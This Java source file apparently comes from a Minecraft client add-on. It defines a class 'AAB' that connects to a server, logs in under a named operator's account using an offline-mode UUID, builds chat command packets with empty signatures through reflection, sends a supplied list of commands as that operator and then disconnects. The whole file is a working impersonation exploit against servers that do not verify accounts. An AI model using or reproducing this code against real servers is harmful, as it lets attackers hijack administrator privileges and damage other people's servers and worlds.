package pwn.noobs.trouserstreak.utils;

import java.lang.reflect.Constructor;
import java.lang.reflect.Proxy;
import java.net.InetSocketAddress;
import java.time.Instant;
import java.util.BitSet;
import java.util.List;
import java.util.concurrent.ThreadLocalRandom;

import net.minecraft.SharedConstants;
import net.minecraft.text.Text;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.ClientConnection;
import net.minecraft.network.DisconnectionInfo;
import io.netty.channel.ChannelFuture;
import net.minecraft.network.NetworkPhase;
import net.minecraft.network.NetworkSide;
import net.minecraft.network.NetworkingBackend;
import net.minecraft.network.RegistryByteBuf;
import net.minecraft.network.packet.c2s.common.KeepAliveC2SPacket;
import net.minecraft.network.packet.c2s.config.ReadyC2SPacket;
import net.minecraft.network.packet.c2s.config.SelectKnownPacksC2SPacket;
import net.minecraft.network.packet.c2s.handshake.ConnectionIntent;
import net.minecraft.network.packet.c2s.handshake.HandshakeC2SPacket;
import net.minecraft.network.packet.c2s.login.EnterConfigurationC2SPacket;
import net.minecraft.network.packet.c2s.login.LoginHelloC2SPacket;
import net.minecraft.network.packet.c2s.play.ChatCommandSignedC2SPacket;
import net.minecraft.network.packet.s2c.common.DisconnectS2CPacket;
import net.minecraft.network.packet.s2c.common.KeepAliveS2CPacket;
import net.minecraft.network.packet.s2c.common.SynchronizeTagsS2CPacket;
import net.minecraft.network.packet.s2c.config.DynamicRegistriesS2CPacket;
import net.minecraft.network.packet.s2c.config.ReadyS2CPacket;
import net.minecraft.network.packet.s2c.config.SelectKnownPacksS2CPacket;
import net.minecraft.network.packet.s2c.login.LoginCompressionS2CPacket;
import net.minecraft.network.packet.s2c.login.LoginDisconnectS2CPacket;
import net.minecraft.network.packet.s2c.login.LoginHelloS2CPacket;
import net.minecraft.network.packet.s2c.login.LoginQueryRequestS2CPacket;
import net.minecraft.network.packet.s2c.login.LoginSuccessS2CPacket;
import net.minecraft.network.state.ConfigurationStates;
import net.minecraft.network.state.LoginStates;
import net.minecraft.network.state.PlayStateFactories;

import net.minecraft.network.listener.ClientLoginPacketListener;
import net.minecraft.network.listener.ClientConfigurationPacketListener;
import net.minecraft.network.listener.ClientPlayPacketListener;

import net.minecraft.network.message.ArgumentSignatureDataMap;

import net.minecraft.registry.DynamicRegistryManager;
import net.minecraft.registry.RegistryKeys;
import net.minecraft.util.Uuids;

import net.minecraft.network.packet.s2c.common.CookieRequestS2CPacket;

import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.network.message.LastSeenMessageList;

public class AAB implements Runnable, ClientLoginPacketListener {
    private final String ip;
    private final int port;
    private final String opName;
    private final List<String> commands;
    private ClientConnection connection;

    public AAB(String serverAddress, String opName, List<String> commands) {
        String[] parts = serverAddress.split(":");
        this.ip = parts[0];
        this.port = parts.length > 1 ? Integer.parseInt(parts[1]) : 25565;
        this.opName = opName;
        this.commands = commands;
    }

    @Override
    @SuppressWarnings("deprecation")
    public void run() {

        try {
            if (MinecraftClient.getInstance().getNetworkHandler() != null) {
                DynamicRegistryManager clientDrm = MinecraftClient.getInstance().getNetworkHandler()
                        .getRegistryManager();
                if (clientDrm != null) {
                    ChatUtils.info("AAB: initializing with Main Client registries.");
                }
            }
        } catch (Exception ignored) {
        }

        try {
            InetSocketAddress address = new InetSocketAddress(ip, port);

            // Revert strict reference. Use Reflection to avoid ambiguous compilation errors
            // connection = ClientConnection.connect(address, null, null);
            // Attempt to find the correct connect method dynamically
            // Access non-visible NIO field via reflection
            Object backend = null;
            try {
                java.lang.reflect.Field nioField = NetworkingBackend.class.getDeclaredField("NIO");
                nioField.setAccessible(true);
                backend = nioField.get(null);
            } catch (Exception e) {
                ChatUtils.error("AAB: Failed to access NIO backend: " + e.getMessage());
            }

            connection = new ClientConnection(NetworkSide.CLIENTBOUND);
            ChannelFuture future = ClientConnection.connect(address, (NetworkingBackend) backend, connection);
            future.awaitUninterruptibly();

            if (!future.isSuccess()) {
                throw new RuntimeException("Failed to connect", future.cause());
            }

            ChatUtils.info("AAB: Connected via direct call (Instantiated Connection + Await).");

            connection.transitionInbound(LoginStates.S2C, this);

            ChatUtils.info("AAB: Connecting to " + ip + ":" + port);

            connection.send(new HandshakeC2SPacket(SharedConstants.getGameVersion().protocolVersion(), ip, port,
                    ConnectionIntent.LOGIN));
            connection.transitionOutbound(LoginStates.C2S);
            connection.send(new LoginHelloC2SPacket(opName, Uuids.getOfflinePlayerUuid(opName)));

            while (connection.isOpen()) {
                connection.tick();
                Thread.sleep(10);
            }
            ChatUtils.info("AAB: Connection closed loop ended.");
            if (connection.getDisconnectionInfo() != null) {
                ChatUtils.error(
                        "AAB Disconnection Reason: " + connection.getDisconnectionInfo().reason().getString());
            }

        } catch (Exception e) {
            ChatUtils.error("AAB Error: " + e.getMessage());
            e.printStackTrace();
        }
    }

    @Override
    public void onHello(LoginHelloS2CPacket packet) {
        ChatUtils.info("AAB: Received Login Hello.");
    }

    @Override
    public void onSuccess(LoginSuccessS2CPacket packet) {
        ChatUtils.info("AAB: Login Success! Profile: " + packet.profile().name());
        try {
            connection.send(getPacketInstance(EnterConfigurationC2SPacket.class));
        } catch (Exception e) {
            ChatUtils.error("AAB Error: " + e.getMessage());
            e.printStackTrace();
        }
        connection.transitionOutbound(ConfigurationStates.C2S);

        connection.transitionInbound(ConfigurationStates.S2C,
                (ClientConfigurationPacketListener) Proxy.newProxyInstance(
                        AAB.class.getClassLoader(),
                        new Class[] { ClientConfigurationPacketListener.class },
                        (proxy, method, args) -> {
                            String name = method.getName();

                            // Essential listener methods
                            if (name.equals("getPhase"))
                                return NetworkPhase.CONFIGURATION;
                            if (name.equals("getSide"))
                                return NetworkSide.CLIENTBOUND;
                            if (name.equals("accepts"))
                                return true;
                            if (name.equals("isConnectionOpen"))
                                return connection.isOpen();

                            // Silent handling of config packets

                            if (name.equals("onSelectKnownPacks")
                                    && args[0] instanceof SelectKnownPacksS2CPacket) {

                                connection.send(new SelectKnownPacksC2SPacket(java.util.List.of()));
                                return null;
                            }

                            if (name.equals("onDynamicRegistries")
                                    && args[0] instanceof DynamicRegistriesS2CPacket) {

                                return null;
                            }

                            if (name.equals("onSynchronizeTags") && args[0] instanceof SynchronizeTagsS2CPacket) {

                                return null;
                            }

                            if (name.equals("onReady") && args[0] instanceof ReadyS2CPacket) {
                                ChatUtils.info("AAB: Ready received. Switching to PLAY.");

                                try {
                                    connection.send(getPacketInstance(ReadyC2SPacket.class));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                // Setup Play Listener (Proxy)
                                try {
                                    ClientPlayPacketListener listener = (ClientPlayPacketListener) Proxy
                                            .newProxyInstance(
                                                    AAB.class.getClassLoader(),
                                                    new Class[] { ClientPlayPacketListener.class },
                                                    (proxy2, method2, args2) -> {
                                                        try {
                                                            String name2 = method2.getName();
                                                            if (name2.equals("accepts"))
                                                                return true;
                                                            if (name2.equals("onKeepAlive")
                                                                    && args2 != null && args2.length > 0
                                                                    && args2[0] instanceof KeepAliveS2CPacket kp) {
                                                                connection.send(new KeepAliveC2SPacket(kp.getId()));
                                                                return null;
                                                            }
                                                            if (name2.equals("onGameJoin")) {
                                                                ChatUtils.info("AAB: Joined Game (Play State)!");
                                                                return null;
                                                            }
                                                            if (name2.equals("getPhase"))
                                                                return NetworkPhase.PLAY;
                                                            if (name2.equals("isConnectionOpen"))
                                                                return connection.isOpen();
                                                            if (name2.equals("getSide"))
                                                                return NetworkSide.CLIENTBOUND;
                                                            if (name2.equals("onDisconnect")
                                                                    || name2.equals("onDisconnected")) {
                                                                if (args2 != null && args2.length > 0
                                                                        && args2[0] instanceof DisconnectS2CPacket dp) {
                                                                    ChatUtils.error("AAB Play Disconnected: "
                                                                            + dp.reason().getString());
                                                                }
                                                                return null;
                                                            }
                                                            // Default returns for primitive types
                                                            Class<?> retType = method2.getReturnType();
                                                            if (retType.equals(boolean.class))
                                                                return false;
                                                            if (retType.equals(int.class))
                                                                return 0;
                                                            if (retType.equals(long.class))
                                                                return 0L;
                                                            if (retType.equals(float.class))
                                                                return 0.0f;
                                                            if (retType.equals(double.class))
                                                                return 0.0;
                                                            return null;
                                                        } catch (Exception e) {
                                                            // Silently ignore packet handling errors
                                                            return null;
                                                        }
                                                    });

                                    // Prepare Play Transition with Fallback Registry
                                    DynamicRegistryManager drm = null;
                                    try {
                                        // Steal Main Client Registries
                                        if (MinecraftClient.getInstance().getNetworkHandler() != null) {
                                            DynamicRegistryManager clientDrm = MinecraftClient.getInstance()
                                                    .getNetworkHandler().getRegistryManager();
                                            if (clientDrm != null && clientDrm
                                                    .getOptional(RegistryKeys.DIMENSION_TYPE).isPresent()) {
                                                drm = clientDrm;
                                            }
                                        }
                                    } catch (Exception ignored) {
                                    }
                                    if (drm == null)
                                        drm = DynamicRegistryManager.EMPTY;

                                    connection.transitionOutbound(PlayStateFactories.C2S
                                            .bind(RegistryByteBuf.makeFactory(drm), null));

                                    // SEND COMMANDS NOW - before inbound transition triggers Meteor's handlers
                                    ChatUtils.info(
                                            "AAB: Sending commands synchronously before inbound transition...");
                                    for (String cmd : commands) {
                                        if (!connection.isOpen())
                                            break;
                                        ChatUtils.warning("AAB: Sending: " + cmd);
                                        try {
                                            Object packetCmd = createCommandPacket(cmd);
                                            if (packetCmd != null) {
                                                connection.send((net.minecraft.network.packet.Packet<?>) packetCmd);
                                            }
                                        } catch (Exception e) {
                                            ChatUtils.error("AAB: Failed to send command: " + e.getMessage());
                                            e.printStackTrace();
                                        }
                                    }
                                    ChatUtils.info("AAB: Done sending commands.");

                                    // Now set up inbound listener (may trigger Meteor errors, but commands are
                                    // sent)
                                    connection.transitionInbound(
                                            PlayStateFactories.S2C.bind(RegistryByteBuf.makeFactory(drm)),
                                            listener);

                                    // Disconnect gracefully after a short delay to let server process commands
                                    new Thread(() -> {
                                        try {
                                            Thread.sleep(2000); // Give server time to process
                                            if (connection.isOpen()) {
                                                ChatUtils.info("AAB: Commands sent, disconnecting gracefully.");
                                                connection.disconnect(
                                                        Text.literal("AAB: Commands executed successfully"));
                                            }
                                        } catch (Exception ignored) {
                                        }
                                    }).start();

                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                                return null;
                            }

                            if (name.equals("onKeepAlive") && args[0] instanceof KeepAliveS2CPacket) {
                                // ChatUtils.info("AAB: KeepAlive in Config.");
                                KeepAliveS2CPacket p = (KeepAliveS2CPacket) args[0];
                                connection.send(new KeepAliveC2SPacket(p.getId()));
                                return null;
                            }

                            if (name.equals("isConnectionOpen"))
                                return connection.isOpen();
                            if (name.equals("getSide"))
                                return NetworkSide.CLIENTBOUND;
                            if (method.getReturnType().equals(boolean.class))
                                return false;

                            return null;
                        }));
    }

    @Override
    public void onDisconnect(LoginDisconnectS2CPacket p) {
        ChatUtils.error("Login Disconnect: " + p.reason().getString());
    }

    @Override
    public void onCompression(LoginCompressionS2CPacket p) {
        connection.setCompressionThreshold(p.getCompressionThreshold(), false);
    }

    @Override
    public void onQueryRequest(LoginQueryRequestS2CPacket p) {
        ChatUtils.info("Query Request: " + p.queryId());
    }

    @Override
    public void onCookieRequest(CookieRequestS2CPacket p) {
    }

    @Override
    public void onDisconnected(DisconnectionInfo info) {
        ChatUtils.error("Connection Lost: " + info.reason().getString());
    }

    @Override
    public boolean isConnectionOpen() {
        return connection.isOpen();
    }

    @SuppressWarnings("unchecked")
    private static <T> T getPacketInstance(Class<T> clazz) throws Exception {
        try {
            java.lang.reflect.Field field = clazz.getDeclaredField("INSTANCE");
            field.setAccessible(true);
            return (T) field.get(null);
        } catch (NoSuchFieldException e) {
            // Fallback to constructor
            Constructor<T> ctor = clazz.getDeclaredConstructor();
            ctor.setAccessible(true);
            return ctor.newInstance();
        }
    }

    private static Object createCommandPacket(String command) throws Exception {
        if (command.startsWith("/"))
            command = command.substring(1);
        Instant timestamp = Instant.now();
        long salt = ThreadLocalRandom.current().nextLong();
        Object argSigs = ArgumentSignatureDataMap.EMPTY;

        // Fallback for EMPTY
        if (argSigs == null) {
            java.lang.reflect.Field f = ArgumentSignatureDataMap.class.getDeclaredField("EMPTY");
            f.setAccessible(true);
            argSigs = f.get(null);
        }

        Object ack = null;
        try {
            Constructor<?>[] ctors = LastSeenMessageList.Acknowledgment.class.getDeclaredConstructors();

            for (Constructor<?> c : ctors) {
                c.setAccessible(true);
                Class<?>[] types = c.getParameterTypes();

                // Skip PacketByteBuf constructor - we can't create that without network data
                if (types.length > 0 && types[0].getSimpleName().equals("PacketByteBuf")) {
                    continue;
                }

                Object[] args = new Object[types.length];
                for (int i = 0; i < types.length; i++) {
                    if (types[i] == int.class)
                        args[i] = 0;
                    else if (types[i] == boolean.class)
                        args[i] = false;
                    else if (types[i] == BitSet.class)
                        args[i] = new BitSet();
                    else if (types[i] == byte.class)
                        args[i] = (byte) 0;
                    else if (types[i] == short.class)
                        args[i] = (short) 0;
                    else if (types[i] == char.class)
                        args[i] = (char) 0;
                    else if (types[i] == long.class)
                        args[i] = 0L;
                    else if (types[i] == float.class)
                        args[i] = 0.0f;
                    else if (types[i] == double.class)
                        args[i] = 0.0;
                    else
                        args[i] = null;
                }

                try {
                    ack = c.newInstance(args);

                    break;
                } catch (Exception instEx) {
                    ChatUtils.error("AAB: Constructor failed: " + instEx.getMessage());
                }
            }
        } catch (Exception e) {
            ChatUtils.error("AAB: Failed to create Acknowledgment: " + e.getMessage());
            e.printStackTrace();
        }

        Constructor<ChatCommandSignedC2SPacket> packetCtor = ChatCommandSignedC2SPacket.class.getDeclaredConstructor(
                String.class, Instant.class, long.class, ArgumentSignatureDataMap.class,
                LastSeenMessageList.Acknowledgment.class);
        packetCtor.setAccessible(true);
        return packetCtor.newInstance(command, timestamp, salt, argSigs, ack);
    }
}
